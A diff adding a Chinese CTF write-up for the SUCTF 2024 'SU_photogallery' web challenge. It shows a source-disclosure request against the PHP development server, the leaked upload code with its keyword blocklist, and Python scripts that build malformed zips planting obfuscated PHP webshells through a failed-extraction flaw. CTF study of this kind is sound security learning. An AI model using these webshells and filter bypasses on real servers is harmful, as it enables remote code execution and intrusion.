@@ -1,4 +1,4 @@
-# SUCTF_2024
+# SUCTF_2024 复现
 
 ## Web
 
@@ -381,4 +381,337 @@ echo base64_encode(serialize($poc));
 注意命名空间规范!!!!
 
 后续就是提权读flag
+
+
+
+### SU_photogallery
+
+![image-20250121215257528](assets/image-20250121215257528.png)
+
+hint，可以通过这个猜到存在unzip页面
+
+![image-20250121213821920](assets/image-20250121213821920.png)
+
+该版本的php存在源码泄露的漏洞
+
+[PHP<=7.4.21 Development Server源码泄露漏洞](https://buaq.net/go-147962.html)
+
+![image-20250121214914694](assets/image-20250121214914694.png)
+
+payload:这个payload很讲究，少两个回车都读不了
+
+```
+GET /unzip.php HTTP/1.1
+Host: localhost:9595
+
+GET /1.txt HTTP/1.1
+
+
+```
+
+读到unzip.php的源码
+
+```php
+<?php
+/*
+ * @Author: Nbc
+ * @Date: 2025-01-13 16:13:46
+ * @LastEditors: Nbc
+ * @LastEditTime: 2025-01-13 16:31:53
+ * @FilePath: \src\unzip.php
+ * @Description: 
+ * 
+ * Copyright (c) 2025 by Nbc, All Rights Reserved. 
+ */
+error_reporting(0);
+
+function get_extension($filename){
+    return pathinfo($filename, PATHINFO_EXTENSION);
+}
+function check_extension($filename,$path){
+    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
+    
+    if (is_file($filePath)) {
+        $extension = strtolower(get_extension($filename));
+
+        if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
+            if (!unlink($filePath)) {
+                // echo "Fail to delete file: $filename\n";
+                return false;
+                }
+            else{
+                // echo "This file format is not supported:$extension\n";
+                return false;
+                }
+    
+        }
+        else{
+            return true;
+            }
+}
+else{
+    // echo "nofile";
+    return false;
+}
+}
+function file_rename ($path,$file){
+    $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file);
+                $oldPath = $path . DIRECTORY_SEPARATOR . $file;
+                $newPath = $path . DIRECTORY_SEPARATOR . $randomName;
+
+                if (!rename($oldPath, $newPath)) {
+                    unlink($path . DIRECTORY_SEPARATOR . $file);
+                    // echo "Fail to rename file: $file\n";
+                    return false;
+                }
+                else{
+                    return true;
+                }
+}
+
+function move_file($path,$basePath){
+    foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) {
+        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
+        if (!rename($file, $destination)){
+            // echo "Fail to rename file: $file\n";
+            return false;
+        }
+      
+    }
+    return true;
+}
+
+
+function check_base($fileContent){
+    $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info'];
+    $base64_keywords = [];
+    foreach ($keywords as $keyword) {
+        $base64_keywords[] = base64_encode($keyword);
+    }
+    foreach ($base64_keywords as $base64_keyword) {
+        if (strpos($fileContent, $base64_keyword)!== false) {
+            return true;
+
+        }
+        else{
+           return false;
+
+        }
+    }
+}
+
+function check_content($zip){
+    for ($i = 0; $i < $zip->numFiles; $i++) {
+        $fileInfo = $zip->statIndex($i);
+        $fileName = $fileInfo['name'];
+        if (preg_match('/\.\.(\/|\.|%2e%2e%2f)/i', $fileName)) {
+            return false; 
+        }
+            // echo "Checking file: $fileName\n";
+            $fileContent = $zip->getFromName($fileName);
+            
+
+            if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) {
+                // echo "Don't hack me!\n";    
+                return false;
+            }
+            else {
+                continue;
+            }
+        }
+    return true;
+}
+
+function unzip($zipname, $basePath) {
+    $zip = new ZipArchive;
+
+    if (!file_exists($zipname)) {
+        // echo "Zip file does not exist";
+        return "zip_not_found";
+    }
+    if (!$zip->open($zipname)) {
+        // echo "Fail to open zip file";
+        return "zip_open_failed";
+    }
+    if (!check_content($zip)) {
+        return "malicious_content_detected";
+    }
+    $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999));
+    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
+    if (!mkdir($path, 0777, true)) {
+        // echo "Fail to create directory";
+        $zip->close();
+        return "mkdir_failed";
+    }
+    if (!$zip->extractTo($path)) {
+        // echo "Fail to extract zip file";
+        $zip->close();
+    }
+    else{
+        for ($i = 0; $i < $zip->numFiles; $i++) {
+            $fileInfo = $zip->statIndex($i);
+            $fileName = $fileInfo['name'];
+            if (!check_extension($fileName, $path)) {
+                // echo "Unsupported file extension";
+                continue;
+            }
+            if (!file_rename($path, $fileName)) {
+                // echo "File rename failed";
+                continue;
+            }
+        }
+    }
+
+    if (!move_file($path, $basePath)) {
+        $zip->close();
+        // echo "Fail to move file";
+        return "move_failed";
+    }
+    rmdir($path);
+    $zip->close();
+    return true;
+}
+
+
+$uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/';
+if (!is_dir($uploadDir)) {
+    mkdir($uploadDir, 0777, true);
+}
+
+if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
+    $uploadedFile = $_FILES['file'];
+    $zipname = $uploadedFile['tmp_name'];
+    $path = $uploadDir;
+
+    $result = unzip($zipname, $path);
+    if ($result === true) {
+        header("Location: index.html?status=success");
+        exit();
+    } else {
+        header("Location: index.html?status=$result");
+        exit();
+    }
+} else {
+    header("Location: index.html?status=file_error");
+    exit();
+}
+```
+
+> **为什么读unzip.php？**
+>
+> ![image-20250121220524310](assets/image-20250121220524310.png)
+>
+> 上传文件，抓包可以看见啦
+
+接下来就是审计代码了
+
+这题的漏洞点在于这里
+
+```php
+   if (!$zip->extractTo($path)) {
+        // echo "Fail to extract zip file";
+        $zip->close();
+    }
+```
+
+可以发现这里在解压失败的时候`$zip->close();`但是并没有return。所以我们只需要构造一个压缩包，解压出我们想解压的部分，然后其他部分是损坏的，这样是不是就可以让整个解压过程是出错的从而进入到if里，我们的shell就这样留下了。
+
+```
+构造压缩包放入webshell和任意文件如1.txt->开始解压->shell解压成功->1.txt解压失败进入if-> $zip->close()
+```
+
+想让ZipArchive报错有两种方法，一种是把文件名改成////，在Linux下文件名不能是'/'所以报错
+
+另一种是放一个名字超长的文件使其解压时报错：[CTF中zip文件的使用](https://twe1v3.top/2022/10/CTF中zip文件的使用)
+
+小脚本
+
+```python
+import zipfile
+import io
+
+mf = io.BytesIO()
+with zipfile.ZipFile(mf, mode="w", compression=zipfile.ZIP_STORED) as zf:
+    zf.writestr('1.php', b'<?php @eval($_POST['cmd']);?>')
+    zf.writestr('A' * 5000, b'AAAAA')
+
+with open("shell.zip", "wb") as f:
+    f.write(mf.getvalue())
+```
+
+直接用肯定是不行的，马子会被waf
+
+在这之前我们还要过一下黑名单
+
+    if (!check_content($zip)) {
+        return "malicious_content_detected";
+    }
+
+```php
+function check_content($zip){
+    for ($i = 0; $i < $zip->numFiles; $i++) {
+        $fileInfo = $zip->statIndex($i);
+        $fileName = $fileInfo['name'];
+        if (preg_match('/\.\.(\/|\.|%2e%2e%2f)/i', $fileName)) {
+            return false; 
+        }
+            // echo "Checking file: $fileName\n";
+            $fileContent = $zip->getFromName($fileName);
+            
+
+            if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) {
+                // echo "Don't hack me!\n";    
+                return false;
+            }
+            else {
+                continue;
+            }
+        }
+    return true;
+}
+```
+
+[一句话木马详解-CSDN博客](https://blog.csdn.net/bylfsj/article/details/101227210)
+
+```php
+import zipfile
+import io
+
+mf = io.BytesIO()
+with zipfile.ZipFile(mf, mode="w", compression=zipfile.ZIP_STORED) as zf:
+    zf.writestr('1.php', b'<?php $a="e"."v"; $b="a"."l"; $c=$a.$b; $c($_POST[\'1\']); ?>')
+    zf.writestr('A' * 5000, b'AAAAA')
+
+with open("shell.zip", "wb") as f:
+    f.write(mf.getvalue())
+```
+
+一句话木马变个型
+
+![image-20250121225633909](assets/image-20250121225633909.png)
+
+访问 url/upload/suimages/1.php
+
+![image-20250121225827327](assets/image-20250121225827327.png)
+
+成功写入,但是eval函数可能被ban了（？）用不了
+
+不管了直接用system吧
+
+```php
+import zipfile
+import io
+
+mf = io.BytesIO()
+with zipfile.ZipFile(mf, mode="w", compression=zipfile.ZIP_STORED) as zf:
+    zf.writestr('4.php', b'<?php $a="sys"."tem"; $a($_POST[\'1\']); ?>')
+    zf.writestr('A' * 5000, b'AAAAA')
+
+with open("shell.zip", "wb") as f:
+    f.write(mf.getvalue())
+```
+
+![image-20250121232721234](assets/image-20250121232721234.png)
+
+### SU_easyk8s_on_aliyun
 
